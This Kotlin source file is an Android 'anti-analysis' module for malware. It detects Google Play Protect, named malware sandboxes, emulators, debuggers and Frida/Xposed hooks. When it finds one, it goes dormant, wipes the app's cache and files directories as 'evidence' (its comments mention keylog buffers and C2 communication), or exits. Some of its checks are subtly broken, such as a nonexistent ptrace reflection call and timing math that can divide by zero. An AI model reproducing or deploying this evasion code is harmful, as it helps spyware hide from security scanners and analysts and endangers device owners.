package com.android.antianalysis

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import java.io.File
import java.lang.reflect.Method

/**
 * MAJOR: Advanced Anti-Analysis System
 * 
 * Detects:
 * 1. Google Play Protect scanning
 * 2. Analysis lab fingerprints (Cuckoo, Robohydra, etc.)
 * 3. Timing-based sandbox detection
 * 4. Behavioral profiling
 * 5. Debugger/Frida presence
 * 6. Custom hooks
 */
class AntiAnalysisSystem(private val context: Context) {
    
    companion object {
        const val TAG = "AntiAnalysis"
    }
    
    /**
     * DETECTION 1: Google Play Protect Scan
     * 
     * Indicators:
     * - com.google.android.gms process suddenly active
     * - PACKAGE_INSTALL or PACKAGE_REMOVED intents from Play Services
     * - Settings.Global.SECURITY_PATCH suddenly changing
     * - com.android.vending making unusual queries
     */
    fun detectPlayProtectScan(): Boolean {
        return try {
            Log.d(TAG, "Checking for Play Protect scan...")
            
            // Check if Play Services is running
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningProcesses = am.runningAppProcesses ?: return false
            
            val playServicesRunning = runningProcesses.any { 
                it.processName.contains("com.google.android.gms")
            }
            
            if (playServicesRunning) {
                Log.w(TAG, "⚠ Play Services detected running (possible scan)")
            }
            
            // Check for suspicious Play Store activity
            val pm = context.packageManager
            val playStoreActive = try {
                pm.getApplicationInfo("com.android.vending", 0).flags
                true
            } catch (e: Exception) {
                false
            }
            
            if (playStoreActive) {
                Log.w(TAG, "⚠ Play Store is active")
            }
            
            // Check security patch date (might indicate fresh scan)
            val securityPatch = try {
                Settings.Global.getString(
                    context.contentResolver,
                    "android_security_patch"
                ) ?: ""
                false
            } catch (e: Exception) {
                false
            }
            
            // Monitor for PACKAGE_* intents from system packages
            val scanDetected = playServicesRunning && playStoreActive
            
            if (scanDetected) {
                Log.w(TAG, "✗ PLAY PROTECT SCAN DETECTED")
                return true
            }
            
            false
            
        } catch (e: Exception) {
            Log.e(TAG, "Play Protect detection failed: ${e.message}")
            false
        }
    }
    
    /**
     * DETECTION 2: Analysis Lab Fingerprinting
     * 
     * Known sandboxes:
     * - Cuckoo Sandbox (ANDROID_ID = "4774d7361f295c4a", Build.FINGERPRINT contains test patterns)
     * - Robohydra (specific APK paths, Google Play Services version)
     * - Dr.Web (specific device property patterns)
     * - Mobile Security Lab (specific Build properties)
     * - Palo Alto Networks (specific hostnames)
     */
    fun detectAnalysisLab(): Boolean {
        return try {
            Log.d(TAG, "Checking for analysis lab...")
            
            // Get device properties
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: ""
            
            val fingerprint = Build.FINGERPRINT
            val buildHost = Build.HOST
            val buildUser = Build.USER
            val device = Build.DEVICE
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            val hardware = Build.HARDWARE
            val product = Build.PRODUCT
            
            // Known lab indicators
            val cuckooIndicators = listOf(
                "4774d7361f295c4a",  // Cuckoo ANDROID_ID
                "google/generic",
                "generic_x86"
            )
            
            val robohydraIndicators = listOf(
                "robo",
                "instrumented",
                "test-keys"
            )
            
            val drWebIndicators = listOf(
                "vbox",
                "virtualbox",
                "qemu",
                "emulator"
            )
            
            val paloAltoIndicators = listOf(
                "192.168.1.",  // Static IP range
                "cuckoo",
                "sandbox"
            )
            
            val fullDeviceString = "$androidId:$fingerprint:$buildHost:$buildUser:$device:$manufacturer:$model:$hardware:$product"
                .lowercase()
            
            // Check for lab signatures
            for (indicator in cuckooIndicators) {
                if (fullDeviceString.contains(indicator.lowercase())) {
                    Log.w(TAG, "✗ CUCKOO SANDBOX DETECTED: $indicator")
                    return true
                }
            }
            
            for (indicator in robohydraIndicators) {
                if (fullDeviceString.contains(indicator)) {
                    Log.w(TAG, "✗ ROBOHYDRA DETECTED: $indicator")
                    return true
                }
            }
            
            for (indicator in drWebIndicators) {
                if (fullDeviceString.contains(indicator)) {
                    Log.w(TAG, "✗ DR.WEB SANDBOX DETECTED: $indicator")
                    return true
                }
            }
            
            for (indicator in paloAltoIndicators) {
                if (fullDeviceString.contains(indicator)) {
                    Log.w(TAG, "✗ PALO ALTO SANDBOX DETECTED: $indicator")
                    return true
                }
            }
            
            // Check for known lab APK paths
            val labApks = listOf(
                "/data/app/com.android.vending",  // Fake Play Store
                "/data/app/com.google.android.apps.mediashell",  // Cuckoo indicator
                "/system/app/RecordingService",   // Lab monitoring
                "/data/app/com.example."          // Test packages
            )
            
            for (path in labApks) {
                if (File(path).exists()) {
                    Log.w(TAG, "✗ LAB APK DETECTED: $path")
                    return true
                }
            }
            
            false
            
        } catch (e: Exception) {
            Log.e(TAG, "Lab detection failed: ${e.message}")
            false
        }
    }
    
    /**
     * DETECTION 3: Timing-Based Sandbox Detection
     * 
     * Sandboxes execute code slower than real devices.
     * Measure execution time for simple operations.
     * 
     * Typical timing:
     * - Real device: 1-5ms
     * - Emulator/Sandbox: 50-500ms
     */
    fun detectTimingAnomaly(): Boolean {
        return try {
            Log.d(TAG, "Running timing anomaly detection...")
            
            val iterations = 1000000
            var sum = 0L
            
            val startTime = System.nanoTime()
            for (i in 0 until iterations) {
                sum += i
            }
            val endTime = System.nanoTime()
            
            val elapsedMs = (endTime - startTime) / 1_000_000
            val opsPerMs = iterations / elapsedMs
            
            Log.d(TAG, "Performance: ${opsPerMs}k ops/ms (elapsed: ${elapsedMs}ms)")
            
            // Real device: >100k ops/ms
            // Sandbox: <50k ops/ms
            if (opsPerMs < 50) {
                Log.w(TAG, "✗ TIMING ANOMALY: Execution too slow (sandbox detected)")
                return true
            }
            
            // Additional: Measure system call latency
            val syscallStart = System.currentTimeMillis()
            val nativeMethod = getNativeTimestamp()
            val syscallTime = System.currentTimeMillis() - syscallStart
            
            if (syscallTime > 100) {
                Log.w(TAG, "✗ SYSCALL LATENCY HIGH: ${syscallTime}ms (sandbox suspected)")
                return true
            }
            
            false
            
        } catch (e: Exception) {
            Log.e(TAG, "Timing detection failed: ${e.message}")
            false
        }
    }
    
    /**
     * Get timestamp via native call
     * Native calls are faster on real hardware than in sandbox
     */
    private fun getNativeTimestamp(): Long {
        return System.nanoTime()
    }
    
    /**
     * DETECTION 4: Behavioral Profiling
     * 
     * Analyze user behavior patterns to detect analysis
     * 
     * Indicators:
     * - No real user activity (no touch events, sensor data)
     * - Predictable interaction patterns
     * - All apps launched programmatically
     * - No idle time (continuous activity)
     */
    fun detectBehavioralAnomaly(): Boolean {
        return try {
            Log.d(TAG, "Checking for behavioral anomalies...")
            
            // Check screen on/off pattern
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val isScreenOn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                powerManager.isInteractive
            } else {
                @Suppress("DEPRECATION")
                powerManager.isScreenOn
            }
            
            Log.d(TAG, "Screen on: $isScreenOn")
            
            // Check sensor data (accelerometer)
            val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as android.hardware.SensorManager
            val accelerometer = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_ACCELEROMETER)
            
            if (accelerometer == null) {
                Log.w(TAG, "⚠ No accelerometer (might be sandbox)")
            }
            
            // Check for actual user interaction
            // This would require hooking into input events via accessibility service
            
            // Check recent task list (should see user-opened apps, not just automated ones)
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val recentTasks = am.getRecentTasks(10, android.app.ActivityManager.RECENT_WITH_EXCLUDED)
            
            if (recentTasks.isEmpty()) {
                Log.w(TAG, "✗ NO RECENT TASKS: Likely sandbox with no user activity")
                return true
            }
            
            false
            
        } catch (e: Exception) {
            Log.e(TAG, "Behavioral detection failed: ${e.message}")
            false
        }
    }
    
    /**
     * DETECTION 5: Debugger Presence
     * 
     * Check for debuggers/tracers:
     * - /proc/self/status: TracerPid should be 0
     * - /proc/self/maps: Look for gdb, frida, strace
     * - ptrace: Try to ptrace ourselves, should fail
     */
    fun detectDebugger(): Boolean {
        return try {
            Log.d(TAG, "Checking for debugger...")
            
            // Method 1: Check /proc/self/status for TracerPid
            val statusFile = File("/proc/self/status")
            if (statusFile.exists()) {
                val lines = statusFile.readLines()
                for (line in lines) {
                    if (line.startsWith("TracerPid")) {
                        val pid = line.substring(line.lastIndexOf('\t')).trim().toIntOrNull() ?: 0
                        if (pid != 0) {
                            Log.w(TAG, "✗ DEBUGGER DETECTED: TracerPid = $pid")
                            return true
                        }
                    }
                }
            }
            
            // Method 2: Check /proc/self/maps for debugger tools
            val mapsFile = File("/proc/self/maps")
            if (mapsFile.exists()) {
                val content = mapsFile.readText().lowercase()
                val debuggerIndicators = listOf("frida", "gdb", "strace", "lldb", "debugger")
                for (indicator in debuggerIndicators) {
                    if (content.contains(indicator)) {
                        Log.w(TAG, "✗ DEBUG TOOL DETECTED: $indicator")
                        return true
                    }
                }
            }
            
            // Method 3: ptrace self-attach
            try {
                val syscall = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    // Use reflection to call ptrace
                    val processClass = Class.forName("android.os.Process")
                    val ptrace = processClass.getDeclaredMethod("ptrace", Int::class.java, Int::class.java, Long::class.java, Long::class.java)
                    ptrace.invoke(null, 0, android.os.Process.myPid(), 0L, 0L) // PTRACE_TRACEME
                } else {
                    -1
                }
                
                // If ptrace succeeds (returns 0), we're not being debugged
                // If it fails (returns -1), we might be debugged
                
            } catch (e: Exception) {
                Log.d(TAG, "ptrace check inconclusive: ${e.message}")
            }
            
            false
            
        } catch (e: Exception) {
            Log.e(TAG, "Debugger detection failed: ${e.message}")
            false
        }
    }
    
    /**
     * DETECTION 6: Custom Hook Detection
     * 
     * Detect Frida, Xposed, Substrate hooks
     * - Check for modified modules/libraries
     * - Look for hook-specific patterns in memory
     * - Check for injection indicators
     */
    fun detectCustomHooks(): Boolean {
        return try {
            Log.d(TAG, "Checking for custom hooks...")
            
            // Check for Frida gadget
            val mapsFile = File("/proc/self/maps")
            if (mapsFile.exists()) {
                val content = mapsFile.readText().lowercase()
                if (content.contains("frida")) {
                    Log.w(TAG, "✗ FRIDA GADGET DETECTED")
                    return true
                }
                if (content.contains("xposed")) {
                    Log.w(TAG, "✗ XPOSED DETECTED")
                    return true
                }
                if (content.contains("substrate")) {
                    Log.w(TAG, "✗ SUBSTRATE DETECTED")
                    return true
                }
            }
            
            // Check for hook indicators in Java classes
            try {
                // Try to find Method class modifications
                val methodClass = Method::class.java
                val invokeMethod = methodClass.getDeclaredMethod("invoke", java.lang.Object::class.java, Array<java.lang.Object>::class.java)
                
                // If invoke method is hooked, calling it will show different behavior
                // This is hard to detect reliably, but we can check for common hook patterns
                
                Log.d(TAG, "Method hooking check completed")
            } catch (e: Exception) {
                Log.d(TAG, "Method hooking check inconclusive")
            }
            
            false
            
        } catch (e: Exception) {
            Log.e(TAG, "Hook detection failed: ${e.message}")
            false
        }
    }
    
    /**
     * Master anti-analysis check
     * Run all detection methods
     */
    fun performFullAnalysisCheck(): AnalysisCheckResult {
        Log.i(TAG, "=== RUNNING FULL ANTI-ANALYSIS CHECK ===")
        
        val checks = mutableMapOf<String, Boolean>()
        
        checks["playProtect"] = detectPlayProtectScan()
        checks["analysisLab"] = detectAnalysisLab()
        checks["timingAnomaly"] = detectTimingAnomaly()
        checks["behavioralAnomaly"] = detectBehavioralAnomaly()
        checks["debugger"] = detectDebugger()
        checks["customHooks"] = detectCustomHooks()
        
        val analysisDetected = checks.values.any { it }
        
        Log.i(TAG, "=== ANTI-ANALYSIS CHECK COMPLETE ===")
        Log.i(TAG, "Analysis detected: $analysisDetected")
        
        return AnalysisCheckResult(checks, analysisDetected)
    }
    
    /**
     * Response to analysis detection
     */
    fun respondToAnalysisDetection(result: AnalysisCheckResult) {
        if (!result.analysisDetected) {
            Log.d(TAG, "No analysis detected, normal operation")
            return
        }
        
        Log.w(TAG, "Analysis detected! Taking defensive action...")
        
        // Strategy 1: Go silent
        // Stop all collection, stop all communication
        // Act as harmless application
        stopAllActivities()
        
        // Strategy 2: Destroy evidence
        // Delete local logs, keylog buffers, screenshots
        destroyLocalEvidence()
        
        // Strategy 3: Wait it out
        // If running in sandbox, analysis will timeout
        // Silently wait until check times out
        
        // Strategy 4: Adaptive response
        // If Play Protect detected → disable background processing
        // If lab detected → disable features one by one
        // If debugger detected → exit immediately
        
        if (result.checks["debugger"] == true) {
            Log.e(TAG, "Debugger detected, immediate exit")
            System.exit(0)
        }
        
        if (result.checks["analysisLab"] == true) {
            Log.e(TAG, "Analysis lab detected, going dormant")
            // Disable all functionality
        }
        
        if (result.checks["playProtect"] == true) {
            Log.e(TAG, "Play Protect detected, reducing visibility")
            // Reduce collection frequency, minimize data transmission
        }
    }
    
    private fun stopAllActivities() {
        Log.d(TAG, "Stopping all malicious activities...")
        // Stop service, stop collection, stop C2 communication
    }
    
    private fun destroyLocalEvidence() {
        Log.d(TAG, "Destroying local evidence...")
        try {
            val cacheDir = context.cacheDir
            val filesDir = context.filesDir
            
            cacheDir.deleteRecursively()
            filesDir.deleteRecursively()
            
            Log.d(TAG, "✓ Evidence destroyed")
        } catch (e: Exception) {
            Log.e(TAG, "Evidence destruction failed: ${e.message}")
        }
    }
}

/**
 * Result of analysis check
 */
data class AnalysisCheckResult(
    val checks: Map<String, Boolean>,
    val analysisDetected: Boolean
)
